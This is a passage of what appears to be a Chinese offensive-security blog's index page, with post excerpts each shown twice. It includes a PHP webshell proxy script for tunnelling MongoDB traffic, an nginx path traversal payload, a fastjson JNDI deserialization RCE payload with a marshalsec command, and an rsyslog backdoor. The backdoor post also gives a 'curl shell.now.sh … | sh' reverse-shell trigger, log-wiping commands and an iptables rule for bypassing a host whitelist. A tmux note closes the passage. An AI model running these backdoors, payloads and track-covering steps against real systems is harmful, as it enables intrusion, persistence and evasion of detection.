    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
    print payload
    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
    print data2
    print &quot;sending data&quot;
    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
 <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889
socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看
mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
	

	</div>
  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
    Elastic, CouchDB, Mongodb, Docker

  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p>
<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
import socket
import binascii
import requests


headers &#x3D; &#123;
&quot;Host&quot;: &quot;&quot;,
&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
&quot;Connection&quot;: &quot;close&quot;
&#125;

url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((&quot;127.0.0.1&quot;,8889))
s.listen(5)
sock, addr_info &#x3D; s.accept()

while True:
    print &#39;Connect by &#39;, addr_info
    data &#x3D; sock.recv(102400)
    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
    print payload
    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
    print data2
    print &quot;sending data&quot;
    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
 <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889
socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看
mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
	
	</div>
  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/10/23/winrm.html" >winRM端口复用</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-10-23  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>连接(默认端口是5985，需要加上去):</p>
<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>连接(默认端口是5985，需要加上去):</p>
<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/09/17/nginx_path_traversle.html" >nginx的目录穿越</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-09-17  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:</p>
<pre class="line-numbers language-none"><code class="language-none">location &#x2F;static &#123;
               alias &#x2F;home&#x2F;uploads&#x2F;static&#x2F;;
       &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">curl vuln.com&#x2F;static..&#x2F;requirements.pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上面如果是两个路径最后都没有带<code>/</code>或者都带<code>/</code>则该漏洞不存在。</p>
<p>代理末尾添加/之后，nginx会先对uri进行normalized处理，使用../读取文件会失败，当没有添加/的时候，nginx会把原请求直接转发给后端服务器，所以可以读取成功。</p>

	

	</div>
  <a type="button" href="/2019/09/17/nginx_path_traversle.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:</p>
<pre class="line-numbers language-none"><code class="language-none">location &#x2F;static &#123;
               alias &#x2F;home&#x2F;uploads&#x2F;static&#x2F;;
       &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">curl vuln.com&#x2F;static..&#x2F;requirements.pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上面如果是两个路径最后都没有带<code>/</code>或者都带<code>/</code>则该漏洞不存在。</p>
<p>代理末尾添加/之后，nginx会先对uri进行normalized处理，使用../读取文件会失败，当没有添加/的时候，nginx会把原请求直接转发给后端服务器，所以可以读取成功。</p>

	
	</div>
  <a type="button" href="/2019/09/17/nginx_path_traversle.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/07/22/fastjson-rce.html" >fastjson被动扫描Burp插件</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-07-22  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>2019/08/13 Update.</p>
<ol>
<li>代码没有考虑到json里面套json的情况。</li>
<li>代码没有考虑到在使用x-www-form-urlencoded的参数是json的情况。<br>这两个加上去之后感觉每个请求的时间都会增加，先挖坑。</li>
</ol>
<p>2019/08/02 Update:</p>
<ol>
<li>之前的代码太的太烂，去掉了不用的代码</li>
<li>增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立<code>/var/tmp/hash.txt</code>文件（自己看着改吧)</li>
<li>如果不熟悉，就看官方文档，文档，文档。</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">main.py

#&#x2F;usr&#x2F;bin&#x2F;env python
#! -*- coding:utf-8 -*-

from burp import IBurpExtender # 定义插件的基本信息类
from burp import IHttpListener # http流量监听类
from burp import IRequestInfo
from noauth import noauth_request
import hashlib

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks &#x3D; callbacks
        self._helpers &#x3D; callbacks.getHelpers() # 通用函数
        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
        print &quot;load fastjson_scan plugin success!&quot;
        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
            if  messageIsRequest:
                request &#x3D; messageInfo.getRequest()
                analyzedRequest &#x3D; self._helpers.analyzeRequest(request)
                contype &#x3D; analyzedRequest.getContentType()  #get Content-type, 这里看官方文档
                url &#x3D; str(messageInfo.getUrl())
                with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;) as f:
                    lines &#x3D; f.read().splitlines()
                m &#x3D; hashlib.md5()
                m.update(url)
                print url
                if contype &#x3D;&#x3D; 4 and m.hexdigest() not in lines:    #是的，json的时候type等于4
                    with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;,&#39;a+&#39;) as f:
                        f.write(m.hexdigest()+&quot;\n&quot;)
                    print &quot;[Info]Check url is: %s&quot; % url
                    cur &#x3D; noauth_request(url)
                    noauth_result &#x3D; cur.run()
                    if noauth_result: 
                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
                    print &quot;&quot;
                else:
                    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>fastjson在<code>1.2.47</code>以下，包括1.2.47存在反序列化导致的远程命令执行，payload:</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:8000&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后在远程主机开启rmi服务和<code>Exploit.class</code>web服务就可以打了。</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:8888&#x2F;#Exploit 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2019/07/22/fastjson-rce.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>2019/08/13 Update.</p>
<ol>
<li>代码没有考虑到json里面套json的情况。</li>
<li>代码没有考虑到在使用x-www-form-urlencoded的参数是json的情况。<br>这两个加上去之后感觉每个请求的时间都会增加，先挖坑。</li>
</ol>
<p>2019/08/02 Update:</p>
<ol>
<li>之前的代码太的太烂，去掉了不用的代码</li>
<li>增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立<code>/var/tmp/hash.txt</code>文件（自己看着改吧)</li>
<li>如果不熟悉，就看官方文档，文档，文档。</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">main.py

#&#x2F;usr&#x2F;bin&#x2F;env python
#! -*- coding:utf-8 -*-

from burp import IBurpExtender # 定义插件的基本信息类
from burp import IHttpListener # http流量监听类
from burp import IRequestInfo
from noauth import noauth_request
import hashlib

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks &#x3D; callbacks
        self._helpers &#x3D; callbacks.getHelpers() # 通用函数
        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
        print &quot;load fastjson_scan plugin success!&quot;
        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
            if  messageIsRequest:
                request &#x3D; messageInfo.getRequest()
                analyzedRequest &#x3D; self._helpers.analyzeRequest(request)
                contype &#x3D; analyzedRequest.getContentType()  #get Content-type, 这里看官方文档
                url &#x3D; str(messageInfo.getUrl())
                with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;) as f:
                    lines &#x3D; f.read().splitlines()
                m &#x3D; hashlib.md5()
                m.update(url)
                print url
                if contype &#x3D;&#x3D; 4 and m.hexdigest() not in lines:    #是的，json的时候type等于4
                    with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;,&#39;a+&#39;) as f:
                        f.write(m.hexdigest()+&quot;\n&quot;)
                    print &quot;[Info]Check url is: %s&quot; % url
                    cur &#x3D; noauth_request(url)
                    noauth_result &#x3D; cur.run()
                    if noauth_result: 
                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
                    print &quot;&quot;
                else:
                    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>fastjson在<code>1.2.47</code>以下，包括1.2.47存在反序列化导致的远程命令执行，payload:</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:8000&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后在远程主机开启rmi服务和<code>Exploit.class</code>web服务就可以打了。</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:8888&#x2F;#Exploit 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2019/07/22/fastjson-rce.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/07/21/rsyslog-backdoor.html" >Rsyslog Backdoor</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-07-21  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。</p>
<h3 id="建立后门"><a href="#建立后门" class="headerlink" title="建立后门"></a>建立后门</h3><pre class="line-numbers language-none"><code class="language-none">echo -e &#39;#!&#x2F;bin&#x2F;sh\nsh -c &quot;$1&quot;&#39;&gt;&#x2F;bin&#x2F;atg
chmod 755 &#x2F;bin&#x2F;atg

echo &quot;auth.*,regex, abcd  ^&#x2F;bin&#x2F;atg&quot; &gt; &#x2F;etc&#x2F;rsyslog.d&#x2F;README.conf

重启生效(Centos用下面的systemctl):
&#x2F;etc&#x2F;init.d&#x2F;rsyslog restart
systemctl restart rsyslog
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h3><pre class="line-numbers language-none"><code class="language-none">echo &quot;xxxxx&#39;;curl https:&#x2F;&#x2F;shell.now.sh&#x2F;127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="擦屁股"><a href="#擦屁股" class="headerlink" title="擦屁股:"></a>擦屁股:</h3><pre class="line-numbers language-none"><code class="language-none">sed -i &#39;&#x2F;xxxxx&#x2F;d&#39; &#x2F;var&#x2F;log&#x2F;secure
kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>如果主机设定了<code>hosts.allow</code>的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)</p>
<pre class="line-numbers language-none"><code class="language-none">iptables -t nat -A INPUT -p tcp -d &lt;受害主机&gt; --dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2019/07/21/rsyslog-backdoor.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。</p>
<h3 id="建立后门"><a href="#建立后门" class="headerlink" title="建立后门"></a>建立后门</h3><pre class="line-numbers language-none"><code class="language-none">echo -e &#39;#!&#x2F;bin&#x2F;sh\nsh -c &quot;$1&quot;&#39;&gt;&#x2F;bin&#x2F;atg
chmod 755 &#x2F;bin&#x2F;atg

echo &quot;auth.*,regex, abcd  ^&#x2F;bin&#x2F;atg&quot; &gt; &#x2F;etc&#x2F;rsyslog.d&#x2F;README.conf

重启生效(Centos用下面的systemctl):
&#x2F;etc&#x2F;init.d&#x2F;rsyslog restart
systemctl restart rsyslog
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h3><pre class="line-numbers language-none"><code class="language-none">echo &quot;xxxxx&#39;;curl https:&#x2F;&#x2F;shell.now.sh&#x2F;127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="擦屁股"><a href="#擦屁股" class="headerlink" title="擦屁股:"></a>擦屁股:</h3><pre class="line-numbers language-none"><code class="language-none">sed -i &#39;&#x2F;xxxxx&#x2F;d&#39; &#x2F;var&#x2F;log&#x2F;secure
kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>如果主机设定了<code>hosts.allow</code>的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)</p>
<pre class="line-numbers language-none"><code class="language-none">iptables -t nat -A INPUT -p tcp -d &lt;受害主机&gt; --dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2019/07/21/rsyslog-backdoor.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/06/24/tmux.html" >tmux使用</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-06-24  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>组合键:</p>
<p>:new&lt;回车&gt;  启动新会话<br>s           列出所有会话<br>w           相当于s的时候展开列表，展开windows<br>$           重命名当前会话</p>
<p>tmux kill-session -t demo # 关闭demo会话</p>
<p>他有一个session,windows,panes的概念</p>
<p>一个session可以有N个windows，N个panes</p>
<p>如果是最大化利用，那么需要找到一种可以跳来跳去的方法，不管是跳windows还是session。</p>
<p>一般来说是跳windows，因为windows下有几个不同的panes</p>
<p>所以，怎么跳最快?</p>
<p>name不管是pane还是windows，是不是只要有name就可以跳过去，不对，应该是windows之间的跳，因为一组windows就是一组任务。</p>
<p>一个session里面可以最下面的状态栏可以看到有几个windows，windows的名字如何</p>
	

	</div>
  <a type="button" href="/2019/06/24/tmux.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>组合键:</p>
<p>:new&lt;回车&gt;  启动新会话<br>s           列出所有会话<br>w           相当于s的时候展开列表，展开windows<br>$           重命名当前会话</p>
<p>tmux kill-session -t demo # 关闭demo会话</p>
<p>他有一个session,windows,panes的概念</p>
<p>一个session可以有N个windows，N个panes</p>
<p>如果是最大化利用，那么需要找到一种可以跳来跳去的方法，不管是跳windows还是session。</p>
<p>一般来说是跳windows，因为windows下有几个不同的panes</p>
<p>所以，怎么跳最快?</p>
<p>name不管是pane还是windows，是不是只要有name就可以跳过去，不对，应该是windows之间的跳，因为一组windows就是一组任务。</p>
<p>一个session里面可以最下面的状态栏可以看到有几个windows，windows的名字如何</p>
	
	</div>
  <a type="button" href="/2019/06/24/tmux.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
